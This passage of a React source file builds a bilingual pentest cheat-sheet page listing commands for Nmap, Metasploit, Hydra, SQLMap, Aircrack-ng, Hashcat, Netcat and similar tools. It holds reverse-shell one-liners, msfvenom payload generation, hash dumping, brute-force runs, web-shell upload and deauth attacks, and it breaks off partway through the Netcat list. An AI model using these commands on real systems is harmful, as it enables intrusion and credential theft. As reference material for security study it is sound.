import Navbar from "@/components/Navbar";
import Footer from "@/components/Footer";
import { Terminal, ChevronDown, ChevronUp, Copy, Check, Search, Globe, Network, Shield, Globe2, Radio, Key, Zap, Database, Wifi, Lock, Bug, Server, Scan, Eye, Hash, UserX, Code, Laptop, Fingerprint, Target, FileSearch, Settings, Crosshair, Skull, AlertTriangle, Layers, Binary, Unplug, HardDrive, Monitor, Cpu, Activity, ShieldAlert, Wrench, FileTerminal, Download, Camera, Dog, Fish, Ghost, Phone, Video, MessageSquare, Users, Magnet, Webhook } from "lucide-react";
import { useState, useMemo } from "react";
import { LucideIcon } from "lucide-react";
import { usePdfExport } from "@/hooks/use-pdf-export";
interface Command {
  command: string;
  description: { ar: string; en: string };
}

interface Tool {
  name: string;
  description: { ar: string; en: string };
  commands: Command[];
  icon?: LucideIcon;
}

// Tool icons mapping
const toolIcons: Record<string, LucideIcon> = {
  "Nmap": Network,
  "Metasploit": Skull,
  "Burp Suite": Globe2,
  "Wireshark": Activity,
  "John the Ripper": Key,
  "Hydra": Zap,
  "SQLMap": Database,
  "Aircrack-ng": Wifi,
  "Nikto": Bug,
  "Hashcat": Hash,
  "Gobuster": FileSearch,
  "Netcat": Unplug,
  "Enum4linux": Monitor,
  "Dirb": Eye,
  "Wfuzz": Crosshair,
  "theHarvester": Scan,
  "Maltego": Fingerprint,
  "Responder": ShieldAlert,
  "Recon-ng": Target,
  "CrackMapExec": HardDrive,
  "Sn1per": Crosshair,
  "Wpscan": Shield,
  "Ffuf": Binary,
  "Feroxbuster": Layers,
  "Crackmapexec": Cpu,
  "Impacket": Wrench,
  "BeEF": AlertTriangle,
  "SET": Settings,
  "Mimikatz": Lock,
  "BloodHound": Scan,
  "Amass": Globe,
  "Nuclei": Bug,
  "Subfinder": Search,
  "Masscan": Network,
  "LinPEAS": Terminal,
  "CamPhish": Camera,
  "HiddenEye": Eye,
  "Seeker": Target,
  "SocialFish": Fish,
  "Hound": Dog,
  "PhoneInfoga": Phone,
  "Sherlock": Users,
  "SpiderFoot": Webhook,
  "ReconDog": Dog,
  "Ghost Phisher": Ghost,
};

const tools: Tool[] = [
  {
    name: "Nmap",
    description: { ar: "أداة فحص الشبكات واكتشاف المنافذ المفتوحة", en: "Network scanning and port discovery tool" },
    commands: [
      { command: "nmap -sP 192.168.1.0/24", description: { ar: "فحص جميع الأجهزة في الشبكة (Ping Scan)", en: "Scan all devices in network (Ping Scan)" } },
      { command: "nmap -sS 192.168.1.1", description: { ar: "فحص سريع للمنافذ (SYN Scan)", en: "Fast port scan (SYN Scan)" } },
      { command: "nmap -sV 192.168.1.1", description: { ar: "اكتشاف إصدارات الخدمات", en: "Service version detection" } },
      { command: "nmap -O 192.168.1.1", description: { ar: "اكتشاف نظام التشغيل", en: "OS detection" } },
      { command: "nmap -A 192.168.1.1", description: { ar: "فحص شامل", en: "Aggressive scan" } },
      { command: "nmap -p 1-65535 192.168.1.1", description: { ar: "فحص جميع المنافذ", en: "Full port scan" } },
      { command: "nmap -sU 192.168.1.1", description: { ar: "فحص منافذ UDP", en: "UDP port scan" } },
      { command: "nmap --script vuln 192.168.1.1", description: { ar: "فحص الثغرات", en: "Vulnerability scan" } },
      { command: "nmap -sN 192.168.1.1", description: { ar: "فحص خفي (Null Scan)", en: "Stealth scan (Null Scan)" } },
      { command: "nmap -oN scan.txt 192.168.1.1", description: { ar: "حفظ النتائج في ملف", en: "Save results to file" } },
      { command: "nmap -sC 192.168.1.1", description: { ar: "تشغيل السكربتات الافتراضية", en: "Run default scripts" } },
      { command: "nmap -Pn 192.168.1.1", description: { ar: "تخطي Ping واعتبار الهدف متصل", en: "Skip ping, treat host as online" } },
      { command: "nmap -T4 192.168.1.1", description: { ar: "فحص سريع (Aggressive Timing)", en: "Fast scan (Aggressive Timing)" } },
      { command: "nmap --script http-enum 192.168.1.1", description: { ar: "اكتشاف مجلدات الويب", en: "Web directory enumeration" } },
      { command: "nmap -sS -sV -O -A 192.168.1.1", description: { ar: "فحص شامل مع كل الميزات", en: "Full scan with all features" } },
      { command: "nmap --script smb-vuln* 192.168.1.1", description: { ar: "فحص ثغرات SMB", en: "SMB vulnerability scan" } },
      { command: "nmap -sV --version-intensity 5 192.168.1.1", description: { ar: "فحص عميق للإصدارات", en: "Deep version scan" } },
      { command: "nmap --top-ports 1000 192.168.1.1", description: { ar: "فحص أشهر 1000 منفذ", en: "Scan top 1000 ports" } },
      { command: "nmap -f 192.168.1.1", description: { ar: "تقسيم الحزم لتجاوز الجدار الناري", en: "Fragment packets for firewall evasion" } },
      { command: "nmap --spoof-mac 0 192.168.1.1", description: { ar: "استخدام MAC عشوائي", en: "Use random MAC address" } },
    ],
  },
  {
    name: "Metasploit",
    description: { ar: "إطار عمل لاختبار الاختراق وتنفيذ الثغرات", en: "Penetration testing framework" },
    commands: [
      { command: "msfconsole", description: { ar: "تشغيل واجهة Metasploit", en: "Start Metasploit console" } },
      { command: "search exploit/windows", description: { ar: "البحث عن ثغرات ويندوز", en: "Search Windows exploits" } },
      { command: "use exploit/multi/handler", description: { ar: "استخدام مستقبل الاتصالات", en: "Use connection handler" } },
      { command: "set PAYLOAD windows/meterpreter/reverse_tcp", description: { ar: "تعيين Payload", en: "Set payload" } },
      { command: "set LHOST 192.168.1.100", description: { ar: "تعيين IP المهاجم", en: "Set attacker IP" } },
      { command: "set LPORT 4444", description: { ar: "تعيين المنفذ", en: "Set port" } },
      { command: "exploit", description: { ar: "تنفيذ الاستغلال", en: "Execute exploit" } },
      { command: "sessions -l", description: { ar: "عرض الجلسات النشطة", en: "List active sessions" } },
      { command: "sessions -i 1", description: { ar: "الدخول للجلسة", en: "Interact with session" } },
      { command: "db_nmap -sV 192.168.1.1", description: { ar: "فحص Nmap وحفظ في قاعدة البيانات", en: "Nmap scan and save to DB" } },
      { command: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe", description: { ar: "إنشاء Payload", en: "Generate payload" } },
      { command: "use auxiliary/scanner/portscan/tcp", description: { ar: "فحص المنافذ", en: "Port scanner" } },
      { command: "use post/windows/gather/hashdump", description: { ar: "استخراج الهاشات", en: "Dump hashes" } },
      { command: "background", description: { ar: "إرسال الجلسة للخلفية", en: "Background session" } },
      { command: "use exploit/windows/smb/ms17_010_eternalblue", description: { ar: "ثغرة EternalBlue", en: "EternalBlue exploit" } },
      { command: "search type:exploit platform:linux", description: { ar: "البحث عن ثغرات لينكس", en: "Search Linux exploits" } },
      { command: "show options", description: { ar: "عرض الخيارات المتاحة", en: "Show options" } },
      { command: "info exploit/windows/smb/ms08_067", description: { ar: "معلومات عن ثغرة", en: "Exploit info" } },
      { command: "vulns", description: { ar: "عرض الثغرات المكتشفة", en: "Show discovered vulnerabilities" } },
      { command: "workspace -a pentest", description: { ar: "إنشاء مساحة عمل جديدة", en: "Create new workspace" } },
    ],
  },
  {
    name: "Burp Suite",
    description: { ar: "أداة لفحص تطبيقات الويب واكتشاف الثغرات", en: "Web application security testing tool" },
    commands: [
      { command: "Proxy → Intercept → On", description: { ar: "تفعيل اعتراض الطلبات", en: "Enable request interception" } },
      { command: "Target → Site map", description: { ar: "عرض خريطة الموقع", en: "View site map" } },
      { command: "Intruder → Positions", description: { ar: "تحديد نقاط الحقن", en: "Set injection points" } },
      { command: "Repeater → Send", description: { ar: "إعادة إرسال الطلبات", en: "Resend requests" } },
      { command: "Scanner → Active scan", description: { ar: "فحص تلقائي للثغرات", en: "Active vulnerability scan" } },
      { command: "Decoder → Encode/Decode", description: { ar: "تشفير وفك تشفير", en: "Encode/Decode" } },
      { command: "Comparer → Compare", description: { ar: "مقارنة استجابتين", en: "Compare responses" } },
      { command: "Extender → BApp Store", description: { ar: "تثبيت إضافات", en: "Install extensions" } },
      { command: "Options → Upstream Proxy", description: { ar: "إعداد بروكسي", en: "Configure proxy" } },
      { command: "Logger → View logs", description: { ar: "عرض السجلات", en: "View logs" } },
      { command: "Intruder → Sniper Attack", description: { ar: "هجوم Sniper", en: "Sniper attack" } },
      { command: "Intruder → Cluster Bomb", description: { ar: "هجوم Cluster Bomb", en: "Cluster Bomb attack" } },
      { command: "Collaborator → Poll now", description: { ar: "فحص Collaborator", en: "Poll Collaborator" } },
      { command: "Target → Scope → Add", description: { ar: "إضافة للنطاق", en: "Add to scope" } },
      { command: "Proxy → Options → Match and Replace", description: { ar: "تعديل الطلبات تلقائياً", en: "Auto-modify requests" } },
      { command: "Sequencer → Live capture", description: { ar: "تحليل التوكنات", en: "Token analysis" } },
      { command: "Scanner → Crawl", description: { ar: "زحف الموقع", en: "Crawl site" } },
      { command: "Proxy → HTTP history", description: { ar: "سجل الطلبات", en: "Request history" } },
      { command: "Target → Issues", description: { ar: "عرض المشاكل المكتشفة", en: "View issues" } },
      { command: "Dashboard → Event log", description: { ar: "سجل الأحداث", en: "Event log" } },
    ],
  },
  {
    name: "Wireshark",
    description: { ar: "أداة تحليل حزم الشبكة", en: "Network packet analyzer" },
    commands: [
      { command: "ip.addr == 192.168.1.1", description: { ar: "فلترة حسب IP", en: "Filter by IP" } },
      { command: "tcp.port == 80", description: { ar: "فلترة حسب منفذ TCP", en: "Filter by TCP port" } },
      { command: "http", description: { ar: "عرض HTTP فقط", en: "Show HTTP only" } },
      { command: "dns", description: { ar: "عرض DNS فقط", en: "Show DNS only" } },
      { command: "tcp.flags.syn == 1", description: { ar: "عرض حزم SYN", en: "Show SYN packets" } },
      { command: "frame contains \"password\"", description: { ar: "البحث عن كلمة", en: "Search for word" } },
      { command: "ip.src == 192.168.1.1", description: { ar: "فلترة حسب المصدر", en: "Filter by source" } },
      { command: "ip.dst == 192.168.1.1", description: { ar: "فلترة حسب الوجهة", en: "Filter by destination" } },
      { command: "Follow TCP Stream", description: { ar: "تتبع محادثة TCP", en: "Follow TCP stream" } },
      { command: "Statistics → Protocol Hierarchy", description: { ar: "إحصائيات البروتوكولات", en: "Protocol statistics" } },
      { command: "http.request.method == \"POST\"", description: { ar: "طلبات POST فقط", en: "POST requests only" } },
      { command: "tcp.analysis.retransmission", description: { ar: "الحزم المعاد إرسالها", en: "Retransmitted packets" } },
      { command: "!arp", description: { ar: "استبعاد ARP", en: "Exclude ARP" } },
      { command: "ssl.handshake", description: { ar: "عرض SSL Handshake", en: "Show SSL Handshake" } },
      { command: "ftp", description: { ar: "عرض FTP فقط", en: "Show FTP only" } },
      { command: "icmp", description: { ar: "عرض ICMP فقط", en: "Show ICMP only" } },
      { command: "tcp.stream eq 0", description: { ar: "عرض Stream محدد", en: "Show specific stream" } },
      { command: "http.response.code == 404", description: { ar: "أخطاء 404", en: "404 errors" } },
      { command: "eth.addr == aa:bb:cc:dd:ee:ff", description: { ar: "فلترة حسب MAC", en: "Filter by MAC" } },
      { command: "Statistics → Conversations", description: { ar: "المحادثات الشبكية", en: "Network conversations" } },
    ],
  },
  {
    name: "John the Ripper",
    description: { ar: "أداة لكسر كلمات المرور", en: "Password cracking tool" },
    commands: [
      { command: "john --wordlist=rockyou.txt hash.txt", description: { ar: "كسر باستخدام قائمة", en: "Crack with wordlist" } },
      { command: "john --format=raw-md5 hash.txt", description: { ar: "كسر MD5", en: "Crack MD5" } },
      { command: "john --show hash.txt", description: { ar: "عرض المكسورة", en: "Show cracked" } },
      { command: "john --incremental hash.txt", description: { ar: "هجوم تزايدي", en: "Incremental attack" } },
      { command: "john --rules hash.txt", description: { ar: "استخدام قواعد", en: "Use rules" } },
      { command: "unshadow /etc/passwd /etc/shadow > hash.txt", description: { ar: "دمج ملفات لينكس", en: "Merge Linux files" } },
      { command: "john --format=NT hash.txt", description: { ar: "كسر NTLM", en: "Crack NTLM" } },
      { command: "john --fork=4 hash.txt", description: { ar: "استخدام 4 أنوية", en: "Use 4 cores" } },
      { command: "john --restore", description: { ar: "استكمال جلسة", en: "Resume session" } },
      { command: "john --list=formats", description: { ar: "عرض الصيغ المدعومة", en: "List supported formats" } },
      { command: "john --pot=cracked.pot hash.txt", description: { ar: "حفظ في ملف مخصص", en: "Save to custom file" } },
      { command: "john --mask=?a?a?a?a hash.txt", description: { ar: "هجوم Mask", en: "Mask attack" } },
      { command: "john --single hash.txt", description: { ar: "وضع Single Crack", en: "Single crack mode" } },
      { command: "john --loopback hash.txt", description: { ar: "إعادة استخدام المكسورة", en: "Reuse cracked passwords" } },
      { command: "john --format=sha512crypt hash.txt", description: { ar: "كسر SHA512", en: "Crack SHA512" } },
      { command: "zip2john file.zip > hash.txt", description: { ar: "استخراج هاش ZIP", en: "Extract ZIP hash" } },
      { command: "pdf2john file.pdf > hash.txt", description: { ar: "استخراج هاش PDF", en: "Extract PDF hash" } },
      { command: "john --session=crack1 hash.txt", description: { ar: "حفظ الجلسة باسم", en: "Save session with name" } },
      { command: "john --status", description: { ar: "حالة الكسر", en: "Crack status" } },
      { command: "john --wordlist=wordlist.txt --rules=best64 hash.txt", description: { ar: "قائمة مع قواعد", en: "Wordlist with rules" } },
    ],
  },
  {
    name: "Hydra",
    description: { ar: "أداة لهجمات القوة الغاشمة", en: "Brute force attack tool" },
    commands: [
      { command: "hydra -l admin -P pass.txt 192.168.1.1 ssh", description: { ar: "هجوم SSH", en: "SSH attack" } },
      { command: "hydra -L users.txt -P pass.txt 192.168.1.1 ftp", description: { ar: "هجوم FTP", en: "FTP attack" } },
      { command: "hydra -l admin -P pass.txt 192.168.1.1 http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"", description: { ar: "هجوم نموذج ويب", en: "Web form attack" } },
      { command: "hydra -l admin -P pass.txt rdp://192.168.1.1", description: { ar: "هجوم RDP", en: "RDP attack" } },
      { command: "hydra -l admin -P pass.txt mysql://192.168.1.1", description: { ar: "هجوم MySQL", en: "MySQL attack" } },
      { command: "hydra -t 4 -l admin -P pass.txt ssh://192.168.1.1", description: { ar: "4 محاولات متزامنة", en: "4 concurrent attempts" } },
      { command: "hydra -V -l admin -P pass.txt 192.168.1.1 ssh", description: { ar: "وضع مفصل", en: "Verbose mode" } },
      { command: "hydra -e nsr -l admin -P pass.txt 192.168.1.1 ssh", description: { ar: "تجربة كلمات مرور فارغة", en: "Try empty passwords" } },
      { command: "hydra -o results.txt -l admin -P pass.txt 192.168.1.1 ssh", description: { ar: "حفظ النتائج", en: "Save results" } },
      { command: "hydra -x 6:8:aA1 192.168.1.1 ssh -l admin", description: { ar: "توليد كلمات مرور", en: "Generate passwords" } },
      { command: "hydra -l admin -P pass.txt smb://192.168.1.1", description: { ar: "هجوم SMB", en: "SMB attack" } },
      { command: "hydra -l admin -P pass.txt telnet://192.168.1.1", description: { ar: "هجوم Telnet", en: "Telnet attack" } },
      { command: "hydra -l admin -P pass.txt vnc://192.168.1.1", description: { ar: "هجوم VNC", en: "VNC attack" } },
      { command: "hydra -l admin -P pass.txt pop3://192.168.1.1", description: { ar: "هجوم POP3", en: "POP3 attack" } },
      { command: "hydra -l admin -P pass.txt imap://192.168.1.1", description: { ar: "هجوم IMAP", en: "IMAP attack" } },
      { command: "hydra -l admin -P pass.txt smtp://192.168.1.1", description: { ar: "هجوم SMTP", en: "SMTP attack" } },
      { command: "hydra -l admin -P pass.txt ldap://192.168.1.1", description: { ar: "هجوم LDAP", en: "LDAP attack" } },
      { command: "hydra -s 8080 -l admin -P pass.txt 192.168.1.1 http-get", description: { ar: "منفذ مخصص", en: "Custom port" } },
      { command: "hydra -w 10 -l admin -P pass.txt 192.168.1.1 ssh", description: { ar: "وقت انتظار 10 ثواني", en: "10 second wait" } },
      { command: "hydra -R", description: { ar: "استكمال جلسة سابقة", en: "Resume previous session" } },
    ],
  },
  {
    name: "SQLMap",
    description: { ar: "أداة آلية لاكتشاف واستغلال ثغرات SQL", en: "Automatic SQL injection tool" },
    commands: [
      { command: "sqlmap -u \"http://site.com/page?id=1\"", description: { ar: "فحص رابط", en: "Scan URL" } },
      { command: "sqlmap -u \"URL\" --dbs", description: { ar: "استخراج قواعد البيانات", en: "Extract databases" } },
      { command: "sqlmap -u \"URL\" -D dbname --tables", description: { ar: "استخراج الجداول", en: "Extract tables" } },
      { command: "sqlmap -u \"URL\" -D dbname -T users --dump", description: { ar: "تفريغ البيانات", en: "Dump data" } },
      { command: "sqlmap -u \"URL\" --current-user", description: { ar: "المستخدم الحالي", en: "Current user" } },
      { command: "sqlmap -u \"URL\" --is-dba", description: { ar: "صلاحيات المدير", en: "DBA check" } },
      { command: "sqlmap -u \"URL\" --os-shell", description: { ar: "الحصول على Shell", en: "Get shell" } },
      { command: "sqlmap -r request.txt", description: { ar: "فحص من ملف", en: "Scan from file" } },
      { command: "sqlmap -u \"URL\" --level=5 --risk=3", description: { ar: "فحص عميق", en: "Deep scan" } },
      { command: "sqlmap -u \"URL\" --tamper=space2comment", description: { ar: "تجاوز الحماية", en: "Bypass filters" } },
      { command: "sqlmap -u \"URL\" --batch", description: { ar: "وضع تلقائي", en: "Batch mode" } },
      { command: "sqlmap -u \"URL\" --passwords", description: { ar: "استخراج كلمات المرور", en: "Extract passwords" } },
      { command: "sqlmap -u \"URL\" --file-read=/etc/passwd", description: { ar: "قراءة ملف", en: "Read file" } },
      { command: "sqlmap -u \"URL\" --file-write=shell.php --file-dest=/var/www/html/", description: { ar: "رفع ملف", en: "Upload file" } },
      { command: "sqlmap -u \"URL\" --sql-shell", description: { ar: "SQL Shell تفاعلي", en: "Interactive SQL shell" } },
      { command: "sqlmap -u \"URL\" --dbms=mysql", description: { ar: "تحديد نوع قاعدة البيانات", en: "Specify DBMS" } },
      { command: "sqlmap -u \"URL\" --technique=BEUST", description: { ar: "تحديد التقنيات", en: "Specify techniques" } },
      { command: "sqlmap -u \"URL\" --threads=10", description: { ar: "10 خيوط متوازية", en: "10 parallel threads" } },
      { command: "sqlmap -u \"URL\" --random-agent", description: { ar: "User-Agent عشوائي", en: "Random User-Agent" } },
      { command: "sqlmap -u \"URL\" --tor", description: { ar: "استخدام Tor", en: "Use Tor" } },
    ],
  },
  {
    name: "Aircrack-ng",
    description: { ar: "مجموعة أدوات لاختبار أمان شبكات Wi-Fi", en: "Wi-Fi security testing suite" },
    commands: [
      { command: "airmon-ng start wlan0", description: { ar: "تفعيل وضع المراقبة", en: "Enable monitor mode" } },
      { command: "airodump-ng wlan0mon", description: { ar: "مسح الشبكات", en: "Scan networks" } },
      { command: "airodump-ng -c 6 --bssid XX:XX:XX -w capture wlan0mon", description: { ar: "التقاط حزم شبكة محددة", en: "Capture specific network" } },
      { command: "aireplay-ng -0 10 -a XX:XX:XX wlan0mon", description: { ar: "هجوم Deauth", en: "Deauth attack" } },
      { command: "aircrack-ng -w wordlist.txt capture.cap", description: { ar: "كسر WPA/WPA2", en: "Crack WPA/WPA2" } },
      { command: "aireplay-ng -1 0 -a XX:XX:XX wlan0mon", description: { ar: "مصادقة مزيفة", en: "Fake auth" } },
      { command: "aireplay-ng -3 -b XX:XX:XX wlan0mon", description: { ar: "إعادة حقن ARP", en: "ARP replay" } },
      { command: "airmon-ng check kill", description: { ar: "إيقاف العمليات المتعارضة", en: "Kill conflicting processes" } },
      { command: "airmon-ng stop wlan0mon", description: { ar: "إيقاف وضع المراقبة", en: "Stop monitor mode" } },
      { command: "aircrack-ng -J hashcat capture.cap", description: { ar: "تصدير لـ Hashcat", en: "Export for Hashcat" } },
      { command: "airodump-ng --encrypt wpa wlan0mon", description: { ar: "عرض WPA فقط", en: "Show WPA only" } },
      { command: "aireplay-ng -9 wlan0mon", description: { ar: "اختبار الحقن", en: "Injection test" } },
      { command: "airbase-ng -a XX:XX:XX -e FakeAP wlan0mon", description: { ar: "إنشاء نقطة وصول مزيفة", en: "Create fake AP" } },
      { command: "airdecap-ng -w passphrase capture.cap", description: { ar: "فك تشفير الحزم", en: "Decrypt packets" } },
      { command: "besside-ng wlan0mon", description: { ar: "كسر تلقائي", en: "Auto crack" } },
      { command: "airodump-ng --wps wlan0mon", description: { ar: "عرض شبكات WPS", en: "Show WPS networks" } },
      { command: "packetforge-ng -0 -a XX:XX:XX -h YY:YY:YY -k 255.255.255.255 -l 255.255.255.255 -y frag.xor -w arp.cap", description: { ar: "إنشاء حزمة ARP", en: "Forge ARP packet" } },
      { command: "airolib-ng mydb --import passwd rockyou.txt", description: { ar: "إنشاء قاعدة بيانات PMK", en: "Create PMK database" } },
      { command: "airodump-ng -c 1,6,11 wlan0mon", description: { ar: "مسح قنوات محددة", en: "Scan specific channels" } },
      { command: "aircrack-ng -b XX:XX:XX capture.cap", description: { ar: "كسر BSSID محدد", en: "Crack specific BSSID" } },
    ],
  },
  {
    name: "Nikto",
    description: { ar: "أداة فحص الثغرات في خوادم الويب", en: "Web server vulnerability scanner" },
    commands: [
      { command: "nikto -h http://192.168.1.1", description: { ar: "فحص أساسي", en: "Basic scan" } },
      { command: "nikto -h http://192.168.1.1 -p 8080", description: { ar: "فحص منفذ محدد", en: "Scan specific port" } },
      { command: "nikto -h http://192.168.1.1 -ssl", description: { ar: "فحص HTTPS", en: "Scan HTTPS" } },
      { command: "nikto -h http://192.168.1.1 -o report.html -Format htm", description: { ar: "تقرير HTML", en: "HTML report" } },
      { command: "nikto -h http://192.168.1.1 -Tuning 9", description: { ar: "فحص SQL Injection", en: "SQL Injection scan" } },
      { command: "nikto -h http://192.168.1.1 -evasion 1", description: { ar: "تجاوز IDS", en: "IDS evasion" } },
      { command: "nikto -h http://192.168.1.1 -maxtime 60s", description: { ar: "تحديد الوقت", en: "Set time limit" } },
      { command: "nikto -h http://192.168.1.1 -C all", description: { ar: "فحص جميع CGI", en: "Scan all CGI" } },
      { command: "nikto -h http://192.168.1.1 -Display V", description: { ar: "عرض تفاصيل", en: "Show details" } },
      { command: "nikto -update", description: { ar: "تحديث قاعدة البيانات", en: "Update database" } },
      { command: "nikto -h http://192.168.1.1 -Tuning 1", description: { ar: "اختبار الملفات المثيرة", en: "Interesting files" } },
      { command: "nikto -h http://192.168.1.1 -Tuning 2", description: { ar: "إعدادات خاطئة", en: "Misconfigurations" } },
      { command: "nikto -h http://192.168.1.1 -Tuning 3", description: { ar: "الإفصاح عن المعلومات", en: "Info disclosure" } },
      { command: "nikto -h http://192.168.1.1 -Tuning 4", description: { ar: "حقن XSS", en: "XSS injection" } },
      { command: "nikto -h http://192.168.1.1 -id admin:password", description: { ar: "مصادقة HTTP", en: "HTTP auth" } },
      { command: "nikto -h http://192.168.1.1 -useproxy http://127.0.0.1:8080", description: { ar: "استخدام بروكسي", en: "Use proxy" } },
      { command: "nikto -h targets.txt", description: { ar: "فحص من ملف", en: "Scan from file" } },
      { command: "nikto -h http://192.168.1.1 -no404", description: { ar: "تجاهل 404", en: "Ignore 404" } },
      { command: "nikto -h http://192.168.1.1 -root /admin", description: { ar: "تحديد المسار الجذري", en: "Set root path" } },
      { command: "nikto -h http://192.168.1.1 -Pause 5", description: { ar: "إيقاف مؤقت 5 ثواني", en: "5 second pause" } },
    ],
  },
  {
    name: "Hashcat",
    description: { ar: "أداة كسر الهاش باستخدام GPU", en: "GPU hash cracking tool" },
    commands: [
      { command: "hashcat -m 0 hash.txt wordlist.txt", description: { ar: "كسر MD5", en: "Crack MD5" } },
      { command: "hashcat -m 1000 hash.txt wordlist.txt", description: { ar: "كسر NTLM", en: "Crack NTLM" } },
      { command: "hashcat -m 1800 hash.txt wordlist.txt", description: { ar: "كسر SHA512", en: "Crack SHA512" } },
      { command: "hashcat -m 22000 hash.hc22000 wordlist.txt", description: { ar: "كسر WPA2", en: "Crack WPA2" } },
      { command: "hashcat -a 3 -m 0 hash.txt ?a?a?a?a?a?a", description: { ar: "هجوم Mask", en: "Mask attack" } },
      { command: "hashcat -a 0 -m 0 hash.txt wordlist.txt -r rules.rule", description: { ar: "هجوم مع قواعد", en: "Attack with rules" } },
      { command: "hashcat -a 6 -m 0 hash.txt wordlist.txt ?d?d", description: { ar: "هجوم مختلط", en: "Hybrid attack" } },
      { command: "hashcat -m 0 hash.txt wordlist.txt --show", description: { ar: "عرض المكسورة", en: "Show cracked" } },
      { command: "hashcat -m 0 hash.txt wordlist.txt -O", description: { ar: "تحسين الأداء", en: "Optimize performance" } },
      { command: "hashcat -I", description: { ar: "معلومات الأجهزة", en: "Device info" } },
      { command: "hashcat --benchmark", description: { ar: "اختبار الأداء", en: "Benchmark" } },
      { command: "hashcat -m 0 hash.txt wordlist.txt --increment", description: { ar: "وضع تزايدي", en: "Increment mode" } },
      { command: "hashcat -m 0 hash.txt wordlist.txt -w 3", description: { ar: "وضع أداء عالي", en: "High performance" } },
      { command: "hashcat -m 0 hash.txt wordlist.txt --session=crack1", description: { ar: "حفظ الجلسة", en: "Save session" } },
      { command: "hashcat --restore", description: { ar: "استكمال الجلسة", en: "Restore session" } },
      { command: "hashcat -m 0 hash.txt wordlist.txt --potfile-disable", description: { ar: "تعطيل Potfile", en: "Disable potfile" } },
      { command: "hashcat -m 0 hash.txt wordlist.txt --force", description: { ar: "تجاوز التحذيرات", en: "Force run" } },
      { command: "hashcat -m 0 hash.txt -a 1 dict1.txt dict2.txt", description: { ar: "هجوم Combinator", en: "Combinator attack" } },
      { command: "hashcat -m 400 hash.txt wordlist.txt", description: { ar: "كسر WordPress", en: "Crack WordPress" } },
      { command: "hashcat -m 1500 hash.txt wordlist.txt", description: { ar: "كسر DES", en: "Crack DES" } },
    ],
  },
  {
    name: "Gobuster",
    description: { ar: "أداة اكتشاف المجلدات والملفات", en: "Directory and file discovery tool" },
    commands: [
      { command: "gobuster dir -u http://target.com -w wordlist.txt", description: { ar: "اكتشاف المجلدات", en: "Directory discovery" } },
      { command: "gobuster dns -d target.com -w subdomains.txt", description: { ar: "اكتشاف النطاقات الفرعية", en: "Subdomain discovery" } },
      { command: "gobuster vhost -u http://target.com -w hosts.txt", description: { ar: "اكتشاف Virtual Hosts", en: "Virtual host discovery" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt", description: { ar: "البحث عن امتدادات محددة", en: "Search specific extensions" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -t 50", description: { ar: "50 خيط متوازي", en: "50 parallel threads" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -o results.txt", description: { ar: "حفظ النتائج", en: "Save results" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -c 'session=abc123'", description: { ar: "استخدام كوكيز", en: "Use cookies" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -a 'Mozilla/5.0'", description: { ar: "تغيير User-Agent", en: "Custom User-Agent" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -r", description: { ar: "تتبع إعادة التوجيه", en: "Follow redirects" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -k", description: { ar: "تجاهل شهادة SSL", en: "Ignore SSL cert" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -b 404,403", description: { ar: "تجاهل أكواد محددة", en: "Ignore specific codes" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -s 200,301", description: { ar: "عرض أكواد محددة فقط", en: "Show only specific codes" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt --wildcard", description: { ar: "التعامل مع Wildcard", en: "Handle wildcard" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -U admin -P password", description: { ar: "مصادقة HTTP", en: "HTTP auth" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -p http://127.0.0.1:8080", description: { ar: "استخدام بروكسي", en: "Use proxy" } },
      { command: "gobuster fuzz -u http://target.com/FUZZ -w wordlist.txt", description: { ar: "وضع Fuzzing", en: "Fuzzing mode" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt --no-error", description: { ar: "تجاهل الأخطاء", en: "Ignore errors" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -d", description: { ar: "عرض نص الاستجابة", en: "Show response body" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt --delay 100ms", description: { ar: "تأخير بين الطلبات", en: "Delay between requests" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -e", description: { ar: "عرض الروابط الكاملة", en: "Show full URLs" } },
    ],
  },
  {
    name: "Netcat",
    description: { ar: "أداة الشبكات متعددة الاستخدامات", en: "Versatile networking tool" },
    commands: [
      { command: "nc -lvnp 4444", description: { ar: "الاستماع على منفذ", en: "Listen on port" } },
      { command: "nc 192.168.1.1 4444", description: { ar: "الاتصال بمنفذ", en: "Connect to port" } },
      { command: "nc -e /bin/bash 192.168.1.1 4444", description: { ar: "Reverse Shell", en: "Reverse shell" } },
      { command: "nc -lvnp 4444 > file.txt", description: { ar: "استقبال ملف", en: "Receive file" } },
      { command: "nc 192.168.1.1 4444 < file.txt", description: { ar: "إرسال ملف", en: "Send file" } },
      { command: "nc -zv 192.168.1.1 1-1000", description: { ar: "فحص المنافذ", en: "Port scan" } },
      { command: "nc -lvnp 4444 -k", description: { ar: "استماع مستمر", en: "Persistent listen" } },
      { command: "nc -u -lvnp 4444", description: { ar: "استماع UDP", en: "UDP listen" } },
      { command: "nc -nvlp 4444 -c 'echo Welcome'", description: { ar: "تنفيذ أمر عند الاتصال", en: "Execute on connect" } },
      { command: "nc -w 5 192.168.1.1 4444", description: { ar: "وقت انتظار 5 ثواني", en: "5 second timeout" } },
      { command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4444 >/tmp/f", description: { ar: "Reverse Shell مع FIFO", en: "Reverse shell with FIFO" } },
      { command: "nc -lvnp 80 < index.html", description: { ar: "خادم HTTP بسيط", en: "Simple HTTP server" } },
      { command: "echo 'GET / HTTP/1.1\\nHost: target.com\\n\\n' | nc target.com 80", description: { ar: "طلب HTTP يدوي", en: "Manual HTTP request" } },
